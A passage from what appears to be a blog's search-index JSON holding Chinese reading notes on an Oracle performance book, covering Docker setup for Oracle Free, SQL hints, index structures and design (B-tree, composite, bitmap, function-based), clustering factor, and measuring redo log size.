是docker数据存储位置registry-mirrors 是镜像加速地址，这里使用的是网易的镜像加速地址保存后重启docker即可，sudo systemctl start docker\n镜像拉取完成后，就可以构建启动容器了。docker run -d --name oracle -h oracle -p 1521:1521 -v /etc/localtime:/etc/localtime:ro container-registry.oracle.com/database/free:latest\n\n-d: 这是一个标志，表示以守护态（detached mode）运行容器，即在后台运行，不会把容器的输出直接打印到当前终端。\n–name oracle: 为新创建的容器指定一个名字 oracle，便于后续引用和管理。\n-h oracle: 设置容器的主机名（hostname）为 oracle。这对于某些依赖主机名的应用配置是有帮助的。\n-p 1521:1521: 映射容器的端口 1521 到宿主机的端口 1521。这允许外部通过宿主机的 1521 端口访问容器中的 Oracle 数据库服务。\n-v &#x2F;etc&#x2F;localtime:&#x2F;etc&#x2F;localtime:ro: 使用卷挂载的方式，将宿主机的 &#x2F;etc&#x2F;localtime 文件或目录以只读（read-only）模式挂载到容器的 &#x2F;etc&#x2F;localtime。这样做是为了确保容器内的时间与宿主机保持一致，避免时区问题。\n\n使用 docker logs -f oracle 查看容器日志，当出现 DATABASE IS READY TO USE! 时，即启动成功。后面就可以愉快地使用Oracle了。\ndocker exec -it oracle sqlplus sys@localhost:1521/FREE as sysdba 进入容器内，并进行登录。\nHINT在SQL查询中，HINT 是一种向数据库优化器提供提示的方式，用来指导SQL执行计划的选择。HINT 不是SQL语言的标准组成部分，而是数据库特有的优化手段，它通常以注释的形式出现在SQL语句中，让数据库的查询优化器遵循某种特定的执行路径或采用特定的算法来处理查询。\n在Oracle数据库中，HINT的写法通常是在表名或视图名后面紧跟一个特定的提示关键字或短语，这些提示被包围在 &#x2F;*+ … *&#x2F; 注释符号内。例如，如果你想提示优化器使用特定的索引，可以这样写：\nSELECT /*+ INDEX(table_name index_name) */ column1, column2FROM table_nameWHERE some_condition;\n\n在这个例子中，INDEX(table_name index_name) 是一个HINT，告诉优化器使用名为 index_name 的索引来访问 table_name。\n还有一些常见的HINT，如：\n\nFULL(table_name) 强制全表扫描。\nUSE_NL(a b) 强制使用嵌套循环连接(a表和b表)。\nUSE_HASH(a b) 强制使用哈希连接(a表和b表)。\nPARALLEL(table_name, degree) 指定表并行查询的度数。\nLEADING(table_name[, ...]) 指定连接顺序的起始表。\n\n需要注意的是，使用HINT应当谨慎，因为它们会绕过数据库自动优化机制，只有在明确知道优化器选择的执行计划不如预期高效时才应考虑使用。而且，随着数据库版本的更新或数据分布的变化，曾经有效的HINT可能不再是最优选择，因此定期审查和调整HINT是必要的。\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"《收获，不止Oracle》读书笔记上篇-索引","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8A%E7%AF%87-%E7%B4%A2%E5%BC%95/","content":"第五章 - 惊叹，索引天地妙不可言BTREE 索引BTREE 索引结构图索引和表一样，都是前面描述的逻辑体系结构中的段的一种，当建一个T表，就产生一个T表的表SEGMENT，当在T表的某些列上建索引DXT，就产生一个DXT的索引SEGMENT。索引是建在表的具体列上，其存在的目的是让表的查询更快，效率更高。表记录丢失关乎生死，而索引丢失只需重建即可，似乎听起来索引只是表的一个附属产品，可有可无。但索引却是数据库学习中最实用的技术之一。\n\n以上结构图说明索引是由Root(根块)，Branch(茎块)和Leaf(叶子块)三部分组成的。其中Leaf(叶子块)主要存储了key column value(索引列具体值)，以及能具体定位到数据块所在位置的rowid(注意区分索引块和数据块)。比如：select * from t where id = 12; 该test表的记录有10050条，而id&#x3D;12仅返回1条，test表的id列建了一个索引，索引是如何快速检索到数据的呢，接下来分析这个索引查询示例图\n\n通过分析该图片，可以大致理解，定位到select * from t where id = 12;大致只需要3个IO(此处只是举个例子，1万多条记录实际情况可能只需要2个IO,这个和索引的高度有关，后续会深入讨论)。首先查询定位到索引的根部，这里是第1次IO接下来根据根块的数据分布，定位到索引的茎部（查询到12的值的大致范围，11..19的部分），这是第2次IO然后定位到叶子块，找到 id&#x3D;12 的部分，此处为第3次IO。假设Oracle在全表扫描记录，遍历所有的数据块，IO的数量必然将大大超过3次。有了这个索引，Oracle只会去扫描部分索引块，而非全部，少做事，必然能大大提升性能。\n根据id列上的索引来查询数据只需要访问索引块，不需要访问数据块吗？显然不是的，这里的语句是select * from t where id=12，这个*表示要展现t表的所有字段，显然只访问索引是不可能包含表的所有字段的，因为该索引只是对id列建索引，也就存储了id列的信息而已。因此上述查询访问完索引块后，必然要再访问数据块，比较快捷的方法是用索引块存储的rowid来快速检索数据块（具体在后续章节会描述）所以3次IO显然是不对的，理应增加一次从索引块到数据块获取各个列信息的检索动作，至少是4次IO才对。\n什么情况下查询可以只访问索引而不访问表呢？如果查询只检索索引列信息，就可以不访问表了，比如查询改成 select id from t where id=12 时就是这种情况。\n建立索引的步骤有一张test表，该表有大致name(varchar22(20),id(number),height(number),age(number)等字段。当前该表有记录，我们要对test表的id列建索引，create index idx id on test(id);\n要建索引先排序未建索引的test表大致记录如下图所示，NULL表示该字段为空值，此外省略号表示略去不显示内容。注意rowid伪列，这个是每一行的唯一标记，每一行的rowid值绝对不重复，可定位到行的记录在数据库中的位置（具体在后续的章节中详细介绍)。\n\n建索引后，先从test表的id列的值顺序取出数据放在内存中（这里需注意，除了id列的值外，还要注意到取该列的值的同时，该行的rowid也被一并取出)，如下图所示。\n\n列值入块成索引依次将内存中的顺序存放的列的值和对应的rowid存进Oracle空闲的BLOCK中，形成了索引块。\n\n填满一块接一块随着索引列的值的不断插入，index block1(L1)很快就被插满了，比如接下来取出的id&#x3D;9的记录无法插入index block1L1)中，就只有插入到新的Oracle块中，index block2(L2)。与此同时，发生了一件非常重要的事情，就是新写数据到另一个块index block3(B1)，这是为啥呢？原来L1和L2平起平坐，谁都不服谁，打起来了，不得了了，无组织无纪律哪能行，赶紧得有人管啊，于是index block3(B1)就担负起管理的角色，这个BLOCK记录了L1和L2的信息，并不记录具体的索引列的键值，目前只占用了B1一点点空间。L3用于管理L2和L2的信息，用于快速定位。\n\n同级两块需人管随着叶子块的不断增加，B1块中虽然仅是存放叶子块的标记，但也挡不住量大，最终也容纳不下了。怎么办？接着装呗，到下一个块B2块去寻找空间容纳。这时B1和B2也平起平坐了。这时又需要另一个块来记录B1、B2的信息，最上层的oot根块诞生了。后续还会出现B3、B4…如果有一天，这些Bn把root块撑满了，root块就不是root块了，他的上面就又有别的块来记录它的信息。\n\n索引结构的三大重要特点索引高度较低\n从下往上看，这个索引树的高度不会很高最底层的叶子块index block因为装具体的数据，所以比较容易被填满，特别是对长度很长的列建索引时更是如此。但是第1层之上的第2层的index block就很不容易装满了吧，因为第2层只是装第1层的指针而已，而第3层是装第2层的index block的指针，更不容易了…因此，这个树如果有很多层，那么表的数据量应该非常大。\n-- 查询占用表空间最大的表（排序）select t.owner,t.segment_name,t.tablespace_name,bytes/1024/1024/1024 as sizes,q.num_rows,t.segment_typefrom dba_segments t         left join dba_tables q                   on t.segment_name=q.table_name                       and t.owner=q.ownerwhere t.segment_type=&#x27;TABLE&#x27;  and t.tablespace_name=&#x27;TBS_FCCENTER_DATA&#x27;  --需要查看的表空间order by 4 desc-- 查询表索引的高度select index_name,       blevel,       leaf_blocks,       num_rows,       distinct_keys,       clustering_factorfrom user_ind_statisticswhere table_name in( &#x27;T&#x27;)order by blevel desc;\n\n看了下测试环境最大的一张表28G大小，快六百万数据，某列索引才4层。书中说有500G一张，记录有几百亿条，但是该表上某列索引的高度才不过6层而已。\n\nBLEVEL&#x3D;0这个层面表示只有叶子块，第1个索引块还没有装满，无须填入第2个块，所以没有上层块来管理，是1层高。而BLEVEL&#x3D;1这个层面表示这个阶段已经到第2层了，同理，BLEVEL&#x3D;2表示已经到第3层，只是还没有将其填满。\n\n索引存储列值\n索引存储了表的索引所在列的具体信息，还包含了标记定位行数据在数据库中位置的rowid取值。\n索引本身有序\n索引是顺序从表里取出数据，再顺序插入到块里形成索引块的，所以说索引块是有序的。\n索引高度较低的用处这里实验省略，语言描述。对于同样高度索引树的表进行查询，如果返回记录是1条。那么走索引查询的效率是差不多的。因为索引高度一样，所以产生的IO次数一样。\n而在没有索引的情况下，查询则会全表扫描，数据量大的话，会十分缓慢。索引的这个高度不高的特性给查询带来了巨大的便捷，但这里的查询只返回1条记录，如果查询返回绝大部分的数据，那用索引反而要慢得多。因为通过索引查到一条数据需要多次IO，取决于索引树的高度。通过索引查表的全量数据的话，需要的IO次数是全表扫描的数倍。同时，全表扫描可以对块进行多块读，进一步提高速度。\n表字段数量也会影响查询的效率。如果表字段很少，同一个块中所能存放的数据也就越多，全表扫描的逻辑读也不会太多。所以会快。相反，如果表字段很多，同一个块中存放的数据就会越少，全表扫描所需遍历的数据块也会增加，速度也就满下来了。\n\n下面是分区索引的设计误区。分区表的系分为两中，一种是局部索引，一种是全局索引。局部索引等同于为每个分区段建分区的索引，从user_segment的数据字典中，可以观察到表有多少个分区，就有多少个分区索引的segment。段的类型为 TABLE PARTITION。每个分区索引也是一个段，每个段的类型为 INDEX PARTITION。而全局索引，也就是普通索引。仅有一个段，段的类型为 INDEX。\n针对分区表的查询逻辑读相比于针对普通表的逻辑读会多好几倍，COST也一样。因为分区表的索引等同于查询了多个小索引，而小索引虽然体积比整个大索引小很多，但是高度却相差无几。这就导致单个小索引的查询和全局大索引的查询的IO数量差不多，而分区索引的IO个数还要乘以分区个数，所产生的IO会远大于全局索引产生的IO。所以分区索引的性能会低。\n因此分区表索引的设计是有讲究的，如果设置了分区索引，但是却用不到分区条件，性能将继续下降。如果建了分区索引，但是又根本无法加上分区字段的条件，那建议不要建分区索引。但如果查询中使用了分区字段的条件，那么结果就不一样了。只需要遍历其中的几个分区即可，效率也大幅提升。\n索引存储列值的用处count(*) 优化下面介绍索引存储列值及rowid的特性，其实身边最常见的语句性能的提升却往往是基于对这个特点的认识。\nselect count(*) from t; 是否能用到索引？\n表的情况和索引情况的差别在于表是把整行的记录依次放进BLOCK形成DATA BLOCK，而索引是把所在列的记录排序后依次放进BLOCK里形成INDEX BLOCK。既然在没有索引的情况下，DATA BLOCK中可以统计出表记录数，那INDEX BLOCK肯定也可以。方法就是前者汇总各个DATA BLOCK中的行的插入记录数，后者汇总各个INDEX BLOCK中的索引列的插入记录数。最关键的是，INDEX BLOCK里存放的值是表的特定的索引列，一列或者就几列，所需容纳空间要比存放整行也就是所有列的DATA BLOCK要少得多，所以这个查询用索引会很高效。\n但Oracle并不会选择走索引，而是选择了全表扫描。（实验略主要原因是索引不能存储空记录，这样如果表的索引列有空的记录，那依据索引来统计表的记录数肯定是不对的，所以Oracle才会选择全表扫描的执行计划。改变一下写法，select count(*) from t where id is not null;便可以让Oracle选择走索引。\n\n将索引列设为非空、或者设为主键（主键是非空的），也可以解决这个问题。\n\n什么时候在表的非空列建有索引时，COUNT(*)语句用索引效率不如全表扫描？如果一张表仅有一个字段，这个索引比表还大（多了rowid)，那从索引中查询，效率会不如全表扫描。\n什么时候COUNT(*)查询语句用索引扫描比全表扫描高效很多呢？表的字段很多，并且字段长度大多都很长，其中有一个非空且长度很短的列建了一个索引，这时索引的体积相对表来说特别小，那索引读效率就高多了。\nSUM&#x2F;AVG 优化select sum(id) from t; 是否能用到索引？是不能的，原因和上面一样，空值的问题。\nselect sum(id), avg(id), count(id) from t where id is not null;只需要一次索引扫描即可完成。\n因为一次扫描索引块，可以同时解决三个问题，所以效率与单个分别执行时一样高。不过列有空值理应不影响在索引中进行SUM和AVG等运算的，这里未指明非空则无法用到索引，其实是不应该的，这是优化器的缺陷。不知道新版本有没有优化\nMAX&#x2F;MIN 优化select max(id) from t; 是否能用到索引？是可以的。这个列的属性是否为空不应该影响能否使用索引作为‘瘦表’查询，但是奇怪的是MAX&#x2F;MIN时无论列是否为空都可以用到索引，而SUM&#x2F;AVG等聚合查询却必须要列为空方可用到索引。其实此类语句在运算时有无加上is not null的取值都是等价查询的，而COUNT(*)则不一样，有无is not null的取值可是不等价的！所以大概是优化器的问题\n执行计划中走索引的查询方式，索引的扫描方式会有很多种。这里先解释 INDEX FULL SCAN(MIN/MAX)这个INDEX FULL SCAN (MIN/MAX)只需要个位数的逻辑读就完成查询的秘密在于，MAX取值只需要往最右边的叶子块看一下，MAX的取值一定在最右边的块上，块里的最后一行就是。而MIN取值，仅往最左边的块里去望一望即可了，最小值一定在里头，块里的第一行记录就是。其中既包含了索引可以存储空值的技巧，又结合了索引是有序的技巧。查询只与索引树的高度有关，无论记录如何增大，查询效率都不会太低。\n但是，select min(id), max(id) from t;就变成全表扫描了。是null值的问题吗？select min(id), max(id) from t where id is not null; 走索引了，但走的是 INDEX FAST FULL SCAN并不是INDEX FULL SCAN (MIN/MAX)。改写成 select max, min from(select max(object_id)max from t) a, (select min(object_id)min from t) b; 就可以走INDEX FULL SCAN (MIN/MAX)了。虽然这种写法很奇怪。 \n索引回表与优化索引回表读(TABLE ACCESS BY INDEX ROWID)它表示通过索引访问表中的数据行。当执行计划中出现这种操作时，意味着Oracle使用索引找到特定行的ROWID（行标识符），然后使用这个ROWID直接访问表中的行。\n从索引中可以读到索引列的信息，但是不可能读到该列以外的其他列的信息.当查询是select * from t where object_id &lt;= 5时，这个*表示该表所有字段都需要返回。因此必然是在扫描索引块中定位到具体object_id&lt;&#x3D;5这部分索引块后，再根据这部分索引块的rowid定位到t表所在的数据块，然后从数据块中获取到其他字段的记录。\n所以只返回需要的字段，而不是使用。有时可以避免回表读，以提高性能。*\n关于TABLE ACCESS BY INDEX ROWID最佳的优化方式是，如果业务允许，可以巧妙地消除这个动作的产生，但是如果存在有些非索引的字段必须展现，可是又不多的情况，该如何优化呢？前面在业务允许的情况下，可以将select * from t where object_id &lt;= 5修正为select object_id from t where object_id&lt;=5从而消除回表，提升性能，假如有些字段必须展现，但又不多，该怎么办呢？比如select object_id,object_name from t where object_id &lt;= 5这个写法，非得展现object_name。可以考虑在object_id和object_name列建组合索引，即可消除回表动作。\n\n联合索引（Composite Index 或 Compound Index）是在多个列上创建的索引。它允许根据多个列的组合来对数据进行排序和快速访问。联合索引在Oracle数据库中非常常见，因为它们可以用于多种查询条件，从而提高查询效率。联合索引基于多个列的组合来构建索引树。当创建联合索引时，Oracle会根据索引定义中列的顺序来生成键值。键值由索引定义中的所有列组成，按照定义的顺序进行排序。联合索引的列顺序很重要。Oracle将按照列定义的顺序来构建键值。通常，将查询中最常用的列放在前面可以提高索引的利用率。\n\n建联合索引后，回表的动作TABLE ACCESS BY INDEX ROWID在执行计划中就没有了。不过这里要注意平衡，·如果联合索引的联合列太多，必然导致索引过大，虽然消减了回表动作，但是索引块变多，在索引中的查询可能就要遍历更多的BLOCK了，所以要全面考虑，联合索引不宜列过多，一般超过3个字段组成的联合索引都是不合适的。\n实际上，回表查询的速度也是有差异的，这里引出一个重要概念叫聚合因子。\n-- 建立无序的表drop table t_colocated purge;create table t_colocated (id number,col2 varchar2(100));begin    for i in 1..100000        loop            insert into t_colocated(id,col2)            values (i,rpad(dbms_random.random,95,&#x27;*&#x27;));    end loop;end;alter table t_colocated add constraint pk_t_colocated primary key(id);-- -- 建立有序的表drop table t_disorganized purge;create table t_disorganized as select id,col2 from t_colocated order by col2;alter table t_disorganized add constraint pk_t_disorg primary key (id);\n\n两张表中，id一个是按顺序插入的，一个是乱序的。而我们都知道，索引是有排列的，此时id列上的索引存放的数据也是有序的。表和索引两者的排列顺序相似度很高，就称之为聚合因子比较低。表和索引两者之间的排列顺序相似度差异明显，就称之为聚合因子比较高。\n通过数据字典来判断索引的聚合因子情况\nSQL&gt; select index_name,blevel,leaf_blocks,num_rows,distinct_keys,clustering_factor from user_ind_statistics where table_name in(&#x27;T_COLOCATED&#x27;,&#x27;T_DISORGANIZED&#x27;);INDEX_NAME                                                                                                                           BLEVEL LEAF_BLOCKS   NUM_ROWS DISTINCT_KEYS CLUSTERING_FACTOR-------------------------------------------------------------------------------------------------------------------------------- ---------- ----------- ---------- ------------- -----------------PK_T_COLOCATED                                                                                                                            1         208     100000        100000              1469PK_T_DISORG                                                                                                                               1         208     100000        100000             99940\n\n这里说明一下CLUSTERING_FACTOR的官方解释：表明有多少临近的索引条目指到不同的数据块。取值99944接近表记录的100000，说明绝大部分的临近索引条目都指向了不同的数据块。取值为1469说明总共只有1469个临近的索引条目指到了不同的数据块，总体还算不错。\n表的插入顺序和索引列的顺序基本一致，从索引中回表查找数据块将会更容易查找，其实通俗地说就是索引块A里装10行列信息及ROWID,这就可以理解为索引条目。然后根据索引条目的ROWID找到表记录时，如果聚合因子很小，10行索引条目可以全部在数据块B块中完整地找到。如果聚合因子很大，或许这10行索引条目对应的数据块的10行记录，分布在10个不同的数据块里。那就要访问了C块，D块，E块等等，回表查询的性能当然就低了。\n所以，当某列的读取频率远高于其他列，那就保证表的排列顺序和这列一致，按照这列的顺序，重组一下表记录来优化即可了。\n索引有序的用处order by 排序优化真正决定性能的是COST的高低和真实完成的时间，一般COST越小性能越高，Oracle执行计划的选择就是由COST来决定的。而时间也是非常简单的衡量的方式，完成时间越短性能越高。而逻辑读方面，是作为参考，在绝大部分情况下（甚至可以说90%以上的场合），逻辑读越少性能越快，但在这里却不适用了。排序算法有些特别，内部的机制导致性能和逻辑读关系不是太大，主要是消耗在CPU性能上，开销极大。此外如果PGA区无法容纳下排序的尺寸而进入磁盘排序，那将成为更大的性能杀手。\n因为索引是有序的，所以排序的查询走索引的话，可以减少排序次数，从而提高性能。\ndistinct 排重优化distinct 这个常见的排除重复数据的写法，会用到排序。排过序的数据更容易去重。\n从含有distinct的查询语句执行计划中，可以发现以及排序次数是0。但TempSpe却是有值的。TempSpc是临时表空间。实际上，DISTINCT是有排序的，只是在 AUTOTRACE 的 SORTS 关键字中不会显现而已。\nDISTINCT 会因为排序而影响性能，不过这里要注意一点，DISTINCT采用的是HASH UNIQUE的算法。其实如果语句修改为select distinct object id_from t where object_id=2这样的等值查询而非范围查询时，将产生SORT UNIQUE NOSORT的算法。\n含有 distinct 的查询语句，走索引查询时，是可以消除其所产生的排序的。不过现实中，DISTINCT语句靠索引来优化往往收效是不明显的，因为大多数情况用到DISTINCT都是因为表记录有重复，因此首要的是要考虑为什么重复。\n索引全扫与快速扫描INDEX FULL SCAN (MIN/MAX)，是针对最大最小取值的一种特别的索引扫描方式。INDEX RANGE SCAN，是一种针对索引高度较低这个特性实现的一种范围扫描，在返回记录很少时相当高效。\nINDEX FULL SCAN和INDEX FAST FULL SCAN的相同点，都是针对整个索引的全扫描，从头到尾遍历索引，而非局部的INDEX FULL SCAN(MIN&#x2F;MAX)和INDEX RANGE SCAN。INDEX FAST FULL SCAN比INDEX FULL SCAN多了一个FAST，所以差别就是索引快速全扫描INDEX FAST FULL SCAN比索引全扫描INDEX FULL SCAN更快。好像是废话那么为什么INDEX FAST FULL SCAN会比INDEX FULL SCAN更快，是因为索引快速全扫描一次读取多个索引块，而索引全扫一次只读取一个块。一次读取多个块不容易保证有序，而一次读取一个块可以保证有序，因此在有排序的场合，INDEX FULL SCAN的顺序读可以让排序消除，而INDEX FAST FULL SCAN虽然减少了逻辑读，但是排序这个动作却无法消除。\n所以说COUNT(*)和SUM之类的统计根本无须使用排序，一般都走INDEX FAST FULL SCAN，而涉及排序语句时，就要开始权衡利弊，也许使用INDEX FAST FULL SCAN更快，也许使用INDEX FULL SCAN更快，由Oracle的优化器计算出成本来选择。\nUNION 合并的优化UNION 合并后没有重复数据，和 DISTINCT 类似，是有排序操作的。UNION ALL 合并后有重复数据，只是简单的合并，不会有排序操作。\n但是这里的 union 是不能利用索引消除排序的。这是因为 union 操作的是两个不同的结果集的筛选，各自的索引当然没法生效。在某些业务场景下，两个 union 的表数据不可能出现重复时，使用 union all 而不使用 union，会提高查询效率。\n主外键设计主外键有三大特点：\n\n主键本身是一种索引\n可以保证表中主键所在列的唯一性\n可以有效地限制外键依赖的表的记录的完整性。\n\n其中前两个特点和CREATE UNIQUE INDEX建立的唯一性索引基本相同。\n外键建索引后，效率会更高，这和表连接的NESTED LOOPS连接方式有关，在后续表连接章节细说。\n在外键上建索引，还能有效避免锁的竞争。\n主外键最基本的一个功能：外键所在表的外键列取值必须在主表中的主键列有记录。否则会报错：ORA-02292 integrity constraint (string.string) violated - child record foundOracle提供的这些功能保证了多表记录之间记录的制约性。\n同样，如果子表中有记录，要删除主表中对应的主键记录，也会报错：ORA-02292 integrity constraint (string.string) violated - child record found级联删除的设置：ALTER TABLE t_c ADD CONSTRAINT fk_t_c_id FOREIGN KEY (t_id) REFERENCES t (id) ON DELETE CASCADE;。添加 ON DELETE CASCADE 关键字。设置级联删除后，删除主表的记录后，会自动将子表中对应的记录一起删除。慎用。\n如果有一张表的某字段没有重复记录，并且只有一个普通索引，该如何改造为主键？因为建主键的动作其实就是建了一个唯一性索引，再增加一个约束。所以 alter table t add constraint t_id_pk primary key(ID); 即可。\n组合索引设计当查询的列在索引或组合索引中时，可以避免回表。回表在执行计划中叫 TABLE ACCESS BY INDEX ROWID\n当组合列返回的记录比较少时，组合索引的效率会比较高。类似 select * from t where a = 1 and b = 2 这种情况，如果在a和b字段建联合索引是不可能消除回表的，因为返回的是所有字段。但是只要 a&#x3D;1 返回较多， b&#x3D;2 返回也较多，组合起来返回很少，就适合建联合索引。但过多的字段建联合索引往往是不可取的，因为这样会导致索引过大，不仅影响了定位数据，更严重影响了更新性能，一般不超过三个字段。\n如果 a &#x3D; 1 and b &#x3D; 2 的返回和前面的单独 a &#x3D; 1 或者单独 b &#x3D; 2 的返回记录数差别不大，那组合索引的快速检索就失去意义了，单独建某列索引更好，因为单独建立的索引体积比组合索引要小，检索的索引块也更少。但如果不是返回所有的列，就是回表的范畴了。组合索引可能更合适。\n\n在等值查询的情况下，组合索引的列无论哪列在前，性能都一样。组合索引在第一字段进行排序，值相同的情况下，对第二个字段进行排序。等值查询时，组合索引无论哪个在前都是一样的。查询到第一个条件的值后，查询第二个条件的值，因为是确定的值，同时索引是有序的，所以条件的顺序不影响查询效率。\n组合索引的两列，当一列是范围查询，一列是等值查询的情况下，等值查询列在前，范围查询列在后，这样的索引最高效。但范围查询不同，范围条件在前时，需要逐个去查符合范围条件的第二个等值条件，它在每个符合范围的值中都是有序的（每个部分都是有序的）而等值条件在前时，去查询符合等值条件的第二个范围条件，则要更简单。因为它整体是有序的。所以查询效率也更高。\n范围查询改写为in查询，in查询的效率更高。因为in可以看作多个等值查询，定位到记录后可以停止继续搜索。\n如果单列的查询列和联合索引的前置列一样，那单列可以不建索引，直接利用联合索引来进行检索数据。\n如果单列的取值不多，可能会用到索引，这种扫描被称为跳跃索引，不过应用场景不多。跳跃索引（Index Skip Scan）是Oracle数据库中的一种特殊的索引访问方式，用于处理包含空值（NULL）的多列索引。跳跃索引可以提高查询性能，尤其是在索引列中存在大量空值的情况下。跳跃索引的工作原理是让Oracle能够跳过那些不包含有效键值的节点，直接访问包含有效键值的节点。这样可以减少不必要的索引扫描，提高查询性能。\n\n不过索引也不是越多越好，虽然可以增加查询效率，减少查询的时间。但会影响更新效率，因为索引的维护需要时间。特别是大量的无序插入，在索引很多的情况下会十分的慢。可以先将索引失效，插入完成后重建索引。可以提升性能。\n\n对INSERT语句负面影响最大，有百害而无一利，只要有索引，插入就慢，越多越慢！\n对DELETE语句来说，有好有坏，在海量数据库定位删除少数记录时，这个条件列是索引列显然是必要的，但是过多列有索引还是会影响明显，因为其他列的索引也要因此被更新。在经常要删除大量记录的时候，危害加剧！\n对UPDATE语句的负面影响最小，快速定位少量记录并更新的场景和DELETE类似，但是具体修改某列时却有差别，不会触及其他索引列的维护。\n\n\n除了索引会影响更新语句外，建索引动作也需要谨慎。建索引会排序，而排序是非常耗CPU的一个动作，如果在系统繁忙时再增加大量排序，对系统来说无疑是雪上添霜。另外建索引的过程会产生锁，而且不是行级锁，是把整个表锁住，任何该表的DML操作都将被阻止。建索引是需要把当前索引列的列值都取出来，排序后依次插入块中形成索引块的，加上锁是为了避免此时列值被更新，导致顺序又变化了，影响了建索引的工作。\nalter index index_name monitoring usage; 对索引进行监控。select * from v$object_usage; 查询监控记录。其中 USED 字段表示索引是否被使用过。alter index index_name nomonitoring usage; 对索引解除监控。另外，要注意监控也是有代价的。\n位图索引create bitmap index index_name on table_name(field_name); 创建位图索引。\n位图索引（Bitmap Index）是一种用于数据库中的特殊类型的索引结构。它主要用于低基数（low cardinality）的列，即那些具有相对较少不同值的列。 位图索引非常适合于数据仓库环境中的大量读取操作，因为它能够非常高效地处理选择查询。\n位图索引的工作原理：位图索引使用一系列位图来表示数据表中的行。对于每一个不同的值，位图索引都会创建一个位图。位图中的每一位对应数据表中的一行记录，如果该行具有相应的值，则对应的位被设置为1；否则，位被设置为0。\n优点：\n\n位图索引非常节省空间，因为只存储0和1，每个值只占用1位。\n非常适合范围查询和过滤操作。可以通过位运算快速找到匹配的行。\n适合数据仓库中的复杂的、批处理式的查询。\n\n缺点：\n\n更新的成本高。低基数的列意味着包含同一值有大量的行，因此更新的影响很大。会导致锁等问题，影响并发。\n不适合高基数的列。对于具有大量不同值的列，位图索引会变得非常大且效率低下。\n对于较小的表，位图索引可能不会带来显著的性能提升，反而会增加额外的管理开销。\n\nCOUNT(*)的性能，在非空列有BTREE索引的情况下，一般用到该索引性能远高于全表扫描。不过性能最高的却是列上有位图索引的情况，甚至比用到普通非空列的BTREE索引时的性能又高出一大截。另外，位图索引可以存储空值。\n位图索引的适合场景要满足两个条件：1. 位图索引列大量重复 2. 该表极少更新\n函数索引对索引列做运算导致索引无法使用。比如 select * from table_name where upper(field_name) = &#39;T&#39;;当必须要对索引列做函数运算时，可以创建函数索引。\ncreate index index_name on table_name(upper(field_name)); 创建函数索引。\n函数索引（Function-Based Index）是一种特殊的索引类型，它允许在数据库中创建基于表达式或函数计算结果的索引。函数索引可以提高某些查询的性能，特别是在查询条件中包含复杂的表达式或函数时。函数索引索的引键是基于表达式的结果，而不是表中的原始列值。当查询包含与函数索引表达式相同的表达式时，Oracle可以使用该索引来加速查询。这可以避免在查询执行时重复计算表达式。\n函数索引的性能介于普通索引和全表扫描之间。因此，能用普通索引就用普通索引。尽量避免列运算。\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"《收获，不止Oracle》读书笔记上篇-表设计","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8A%E7%AF%87-%E8%A1%A8%E8%AE%BE%E8%AE%A1/","content":"第四章 - 祝贺，表设计成就英雄\n普通堆表：适合大部分设计场景，有优点也有缺点，需要和其他表设计取长补短。 \n优点：语法简单方便、适用大部分场景\n缺点：表更新日志开销较大、Delete无法释放空间、表记录太大检索较慢、素引回表读开销很大、即便有序插入，也难以有序读出\n\n\n全局临时表：适合接口表设计\n优点：高效删除、产生日志少、不同SESSION独立，不产生锁\n缺点：语法特别、数据无法得到有效的保护\n\n\n分区表：适合日志表\n优点：有效的分区消除、高效的记录清理、高效的记录转移\n缺点：语法复杂、分区过多对系统有一定的影响\n\n\n索引组织表：适合极少更新的配置表\n优点：表就是索引，可以避免回表、语法复杂\n缺点：更新开销牧大\n\n\n簇表：适合使用频繁关联查询的多表\n优点：可以减少或避免排序\n缺点：语法复杂、表更新开销大\n\n\n\n每个人都有每个人的特点和优势，要善于发掘和利用，才可以把事情做好。不同的表也一样，有的适用于这个应用场景，却不适合另外一个场景，要学会选择性地使用技术。技术其实并不难，最难的是如何选择。 这一章主要就是在强调什么场合该选什么技术。没有高级的技术，只有最合适的技术。\n普通堆表不足之处表更新日志开销较大下面的脚本是利用 v$statname 和 v$mystat 两个动态性能视图来跟踪当前SESSION操作产生的日志量.使用方法很简单：首次先执行该脚本，查看日志大小，随即执行你的更新语句，再执行该脚本返回的日志大小，两者相减，就是你此次更新语句产生的日志大小。\n-- 查看产生多少日志select a.name, b.valuefrom v$statname a,     v$mystat bwhere a.statistic# = b.statistic#  and a.name = &#x27;redo size&#x27;;\n\n-- 赋权grant all on v_$statname to TEST_USER;grant all on v_$mystat to TEST_USER;-- 以下创建视图，方便后续直接用 select * from v_redo_size 进行查询create or replace view v_redo_size asselect a.name, b.valuefrom v$statname a,     v$mystat bwhere a.statistic# = b.statistic#  and a.name = &#x27;redo size&#x27;;\n\n下面观察各个更新操作产生的日志量。\nSQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                               600SQL&gt; delete from t;70927 rows deleted.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                           1152708SQL&gt; insert into t select OBJECT_ID from dba_objects;71191 rows created.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                           2262512SQL&gt; update t set id = rownum;71191 rows updated.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                          13080536\n\n删除操作产生了 1152708 - 600 &#x3D; 1146708 字节，大约1.09M 的日志。插入操作产生了 2262512 - 1152708 &#x3D; 1109804 字节，大约1.06M 的日志。更新操作产生了 13080536 - 2262512 &#x3D; 10818024 字节，大约10.32M 